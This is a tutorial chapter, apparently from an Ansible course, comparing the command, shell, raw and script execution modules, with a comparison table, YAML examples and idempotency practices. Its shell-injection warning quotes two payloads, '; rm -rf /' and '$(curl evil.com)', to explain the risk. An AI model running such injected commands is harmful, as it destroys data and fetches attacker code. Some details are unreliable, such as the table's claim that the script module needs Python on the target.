# 05 - Command Execution Modules: `command` vs `shell` vs `raw` vs `script`

Ansible philosophy strongly favors declarative, idempotent modules (`ansible.builtin.apt`, `ansible.builtin.template`, `ansible.builtin.systemd`) over executing arbitrary terminal commands. However, real-world systems engineering often demands invoking legacy binaries, custom shell pipelines, third-party CLI tools, or bootstrapping environments where Python has not yet been installed.

To satisfy these distinct requirements, Ansible provides four specialized command execution modules: `command`, `shell`, `raw`, and `script`. Choosing the correct module is critical for security, execution performance, and idempotency enforcement.

---

## 🏗️ 1. Architectural Comparison Matrix

Each module operates through an entirely different execution mechanism on the control and managed nodes:

| Feature / Dimension | `ansible.builtin.command` | `ansible.builtin.shell` | `ansible.builtin.raw` | `ansible.builtin.script` |
| :--- | :--- | :--- | :--- | :--- |
| **Execution Engine** | Python `subprocess` directly on binary | Remote `/bin/sh -c` shell | Raw SSH subsystem command string | Pushes local script, runs via remote shell |
| **Pipes & Redirects (`\|`, `>`, `<`)** | ❌ **No** (parsed as literal string arguments) | ✅ **Yes** (full shell features enabled) | ✅ **Yes** (evaluated directly by remote login shell) | ✅ **Yes** (runs inside script context) |
| **Environment Variables (`$HOME`, `$PATH`)** | ❌ **No** (not evaluated by shell) | ✅ **Yes** (expanded by shell) | ✅ **Yes** (expanded by login shell) | ✅ **Yes** (expanded by script shell) |
| **Requires Python on Target?** | ✅ **Yes** (Ansiballz Python module) | ✅ **Yes** (Ansiballz Python module) | ❌ **NO** (zero Python requirement) | ✅ **Yes** (wrapper requires Python) |
| **Shell Injection Risk** | 🛡️ **Extremely Low** (no shell parsing) | ⚠️ **High** (if unescaped variables used) | ⚠️ **High** (evaluated directly by shell) | 🛡️ **Medium** (contained inside script) |
| **Idempotent by Default?** | ❌ **No** (always reports `changed: true`) | ❌ **No** (always reports `changed: true`) | ❌ **No** (always reports `changed: true`) | ❌ **No** (always reports `changed: true`) |
| **Idempotency Guards Supported?** | `creates`, `removes` | `creates`, `removes` | ❌ None | `creates`, `removes` |
| **Primary Use Case** | Default execution of safe binaries | Complex pipelines, redirects, shell syntax | Bootstrapping Python on fresh minimal nodes | Executing complex local scripts on remote nodes |

---

## 🔬 2. Deep Dive: The Four Modules

```text
┌────────────────────────────────────────────────────────────────────────────────────────┐
│                        MODULE EXECUTION MECHANISM COMPARISON                           │
│                                                                                        │
│   1. ansible.builtin.command:                                                          │
│      Ansible Control Node ──(Python Ansiballz)──> Target: execve(["/usr/bin/tar", ...]) │
│      (Bypasses shell completely; immune to shell injection and alias tampering)       │
│                                                                                        │
│   2. ansible.builtin.shell:                                                            │
│      Ansible Control Node ──(Python Ansiballz)──> Target: /bin/sh -c "ps aux | grep .."│
│      (Spawns subshell; supports pipes, redirections, environment variables)           │
│                                                                                        │
│   3. ansible.builtin.raw:                                                              │
│      Ansible Control Node ────────(Raw SSH Exec)─────────> Target: apt-get install py3 │
│      (Zero Python on remote node; direct SSH command channel; used for bootstrapping) │
│                                                                                        │
│   4. ansible.builtin.script:                                                           │
│      Ansible Control Node ──(SFTP Script Copy)──> Target: chmod +x && ./script.sh      │
│      (Executes script residing locally on control node without manual pre-copying)     │
└────────────────────────────────────────────────────────────────────────────────────────┘
```

### 1. `ansible.builtin.command` (Safe & Default)

The `command` module is the default module when executing ad-hoc commands without `-m`. It takes the command name and arguments and invokes the binary directly via Python's underlying `execve` / `subprocess` system calls.

Because it does not invoke a shell, shell features like wildcards (`*`), variables (`$FOO`), redirection (`>`), and pipes (`|`) will not work. In return, it is significantly safer against shell injection vulnerabilities.

```yaml
- name: Extract archive safely without shell expansion
  ansible.builtin.command:
    cmd: tar -xzf /tmp/app-bundle.tar.gz -C /opt/app/
    chdir: /opt/app
    creates: /opt/app/bin/start.sh  # Idempotency guard: skips if this file exists!
```

### 2. `ansible.builtin.shell` (Pipes, Redirects, and Shell Syntax)

The `shell` module wraps the command string inside `/bin/sh -c "<command>"` (or another shell specified via the `executable` parameter). Use this when you require pipelines, logical operators (`&&`, `||`), file redirection, or background process execution.

```yaml
- name: Extract error statistics via shell pipeline
  ansible.builtin.shell:
    cmd: grep "CRITICAL" /var/log/app.log | awk '{print $4}' | sort | uniq -c > /tmp/critical_counts.txt
    executable: /bin/bash
    creates: /tmp/critical_counts.txt
```

> **Security Warning:** Never pass unsanitized user-supplied variables directly into the `shell` module. An unescaped variable containing `; rm -rf /` or `$(curl evil.com)` will be executed by the subshell. Use the `| quote` Jinja2 filter when variables are required:
> ```yaml
> cmd: "echo {{ user_input | quote }} >> /tmp/audit.log"
> ```

### 3. `ansible.builtin.raw` (Bootstrapping Python on Minimal Hosts)

Because Ansible relies on Python on the managed node to execute module code, attempting to run `ansible all -m setup` or `ansible all -m ping` on a bare-metal machine or minimal container (such as Alpine Linux or bare Debian) without Python installed results in immediate failure:
```text
fatal: [node1]: FAILED! => {"ansible_facts": {}, "changed": false, "failed_module_name": "ansible.legacy.ping", "msg": "/usr/bin/python: not found"}
```

The `raw` module bypasses the Ansiballz framework entirely. It transmits the command string directly through the SSH connection channel, allowing administrators to bootstrap Python without any remote prerequisites:

```yaml
- name: Bootstrap Python 3 on minimal managed node
  ansible.builtin.raw:
    cmd: test -e /usr/bin/python3 || (apt-get update && apt-get install -y python3 python3-apt)
  changed_when: false
  become: yes
```

### 4. `ansible.builtin.script` (Running Local Scripts Remotely)

The `script` module allows you to keep an extensive Bash, Python, or Perl script on your control machine and execute it across hundreds of remote servers. Ansible automatically handles copying the script over SFTP to a remote temporary directory, marking it executable (`chmod +x`), executing it with specified arguments, and cleaning up the temporary file upon completion:

```yaml
- name: Execute local diagnostic script on remote database nodes
  ansible.builtin.script:
    cmd: scripts/deep_database_health_check.sh --verbose --threshold 85
    creates: /var/log/health_check_complete.flag
```

---

## 🎯 3. Production Best Practices: Enforcing Idempotency

By default, all command modules report `changed: true` every single time they run, because Ansible cannot natively inspect the internal side effects of an arbitrary binary. This breaks Ansible's core idempotency contract unless guarded with declarative flags.

### Technique 1: `creates` and `removes` Guards

```yaml
# Only runs if the destination binary does NOT yet exist
- name: Compile custom C daemon
  ansible.builtin.command:
    cmd: make install
    chdir: /opt/src/custom-daemon
    creates: /usr/local/bin/custom-daemon

# Only runs if the legacy flag file DOES exist
- name: Remove legacy migration lock
  ansible.builtin.command:
    cmd: rm -f /var/run/migration.lock
    removes: /var/run/migration.lock
```

### Technique 2: `changed_when` and `failed_when` Conditionals

When checking state without altering it, force `changed_when: false` to ensure playbooks maintain accurate recap statistics:

```yaml
- name: Inspect cluster membership status
  ansible.builtin.command:
    cmd: cluster-cli status --format=json
  register: cluster_status
  changed_when: false
  failed_when: "'HEALTHY' not in cluster_status.stdout"
```

---

| Previous | Index | Next |
| :--- | :---: | ---: |
| [← 04 - User and Security Modules user group authorized_key copy](./04-User-and-Security-Modules-user-group-authorized_key-copy.md) | [Index](../../../README.md) | [06 - Network and Utility Modules ping uri get_url stat →](./06-Network-and-Utility-Modules-ping-uri-get_url-stat.md) |
